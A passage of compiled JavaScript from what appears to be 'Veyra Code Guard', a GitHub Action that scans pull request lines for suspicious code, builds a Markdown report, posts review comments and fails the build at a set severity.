    for (const { path, findings } of results) for (const f of findings) lines.push(`| ${ICON[f.severity]} ${f.severity} | \`${path}:${f.line}\` | **${f.title}**: ${f.message.replace(/\|/g, "\\|")} |`);
    lines.push("", "Each line is marked in **Files changed**. To accept a line that is safe, add a comment `veyra-guard-ignore: <rule>` on it or the line above.");
  }
  return lines.join("\n");
}
async function postReview(repo, number, results, body, failing) {
  const comments = results.flatMap(({ path, findings, added }) => findings.filter((f) => !added || added.has(f.line)).map((f) => ({ path, line: f.line, side: "RIGHT", body: `${ICON[f.severity]} **${f.title}** (${f.severity})

${f.message}

${f.why}

<sub>Veyra Code Guard \xB7 rule \`${f.rule}\` \xB7 add \`veyra-guard-ignore: ${f.rule}\` to accept</sub>` }))).slice(0, 50);
  await github(`/repos/${repo}/pulls/${number}/reviews`, { method: "POST", body: JSON.stringify({ event: failing ? "REQUEST_CHANGES" : "COMMENT", body, comments }) });
}
async function main() {
  const root = process.env.GITHUB_WORKSPACE || process.argv[2] || process.cwd();
  const minSeverity = input("min-severity", "low");
  const failOn = input("fail-on", "high");
  const ignore = matcher(input("ignore-paths").split(/[\n,]/));
  const disabled = input("disable-rules").split(/[\s,]+/).filter(Boolean);
  const mode = input("scan", "changed-lines");
  const event = process.env.GITHUB_EVENT_PATH && (0, import_node_fs.existsSync)(process.env.GITHUB_EVENT_PATH) ? JSON.parse((0, import_node_fs.readFileSync)(process.env.GITHUB_EVENT_PATH, "utf8")) : {};
  const repo = process.env.GITHUB_REPOSITORY ?? "";
  const pr = event.pull_request?.number;
  const results = [];
  let scope = "the repository";
  if (pr && mode !== "all") {
    scope = `pull request #${pr}`;
    for (const f of await pullRequestFiles(repo, pr)) {
      if (ignore(f.path)) continue;
      const full = (0, import_node_path.join)(root, f.path);
      if (!(0, import_node_fs.existsSync)(full)) continue;
      const findings = scan((0, import_node_fs.readFileSync)(full, "utf8"), f.path, { minSeverity, disabled, onlyLines: mode === "changed-lines" ? f.added : void 0 });
      if (findings.length) results.push({ path: f.path, findings, added: f.added });
    }
  } else {
    for (const path of walk(root)) {
      if (ignore(path)) continue;
      let text;
      try {
        text = (0, import_node_fs.readFileSync)((0, import_node_path.join)(root, path), "utf8");
      } catch {
        continue;
      }
      const findings = scan(text, path, { minSeverity, disabled });
      if (findings.length) results.push({ path, findings });
    }
  }
  const all = results.flatMap((r) => r.findings);
  const failing = failOn !== "never" && all.some((f) => severityRank(f.severity) >= severityRank(failOn));
  const body = report(results, scope);
  if (process.env.GITHUB_ACTIONS) {
    annotate(results);
    if (process.env.GITHUB_STEP_SUMMARY) (0, import_node_fs.appendFileSync)(process.env.GITHUB_STEP_SUMMARY, body + "\n");
    if (process.env.GITHUB_OUTPUT) (0, import_node_fs.appendFileSync)(process.env.GITHUB_OUTPUT, `findings=${all.length}
critical=${summarize(all).critical}
`);
    if (pr && input("review", "true") === "true" && all.length) {
      try {
        await postReview(repo, pr, results, body, failing);
      } catch (e) {
        console.log(`::notice::Couldn't post a review comment (${e.message.split(":")[0]}). Findings are shown as annotations instead.`);
      }
    }
  } else {
    console.log(body);
  }
  if (failing) {
    console.log(`::error::Veyra Code Guard found ${all.length} suspicious line(s) at or above "${failOn}".`);
    process.exitCode = 1;
  }
}
main().catch((e) => {
  console.log(`::error::Veyra Code Guard failed: ${e.message}`);
  process.exitCode = 1;
});
